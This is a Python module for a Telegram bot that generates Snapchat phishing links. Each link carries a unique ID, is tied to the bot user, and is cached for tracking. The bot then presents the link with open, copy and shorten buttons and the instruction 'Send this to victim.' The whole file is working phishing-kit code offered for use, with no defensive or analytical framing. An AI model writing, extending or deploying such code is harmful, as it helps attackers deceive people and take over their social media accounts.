from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import time
from bot.config import BASE_URL
from bot.utils.storage import link_cache

# ==========================================
# SNAPCHAT: LINK GENERATE
# ==========================================

def generate_snapchat_link(user_id):
    unique_id = str(uuid.uuid4())[:8]
    link = f"{BASE_URL}/p/snap/{unique_id}?v={user_id}"
    link_cache[unique_id] = {
        "user_id": user_id,
        "time": time.time(),
        "type": "snapchat"
    }
    return link

# ==========================================
# SNAPCHAT: BUTTON HANDLER
# ==========================================

def handle_snap_button(bot, message, get_bottom_buttons):
    user_id = message.chat.id
    link = generate_snapchat_link(user_id)
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 Open Link", url=link),
        InlineKeyboardButton("📋 Copy Link", callback_data="snap_copy"),
        InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
        InlineKeyboardButton("⬅ Back", callback_data="snap_back")
    )
    
    bot.send_message(
        user_id,
        f"✅ *SNAPCHAT phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# ==========================================
# SNAPCHAT: INLINE CALLBACK HANDLERS
# ==========================================

def handle_snap_callback(bot, call):
    user_id = call.message.chat.id
    data = call.data
    
    if data == "snap_copy":
        bot.answer_callback_query(call.id, "✅ Link copied to clipboard! (Select and copy manually)")
        return
    
    elif data == "snap_back":
        from bot.__init__ import start
        start(call.message)
        return
    
    elif data == "snap_menu":
        link = generate_snapchat_link(user_id)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="snap_copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
            InlineKeyboardButton("⬅ Back", callback_data="snap_back")
        )
        bot.edit_message_text(
            f"✅ *SNAPCHAT phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
            chat_id=user_id,
            message_id=call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return
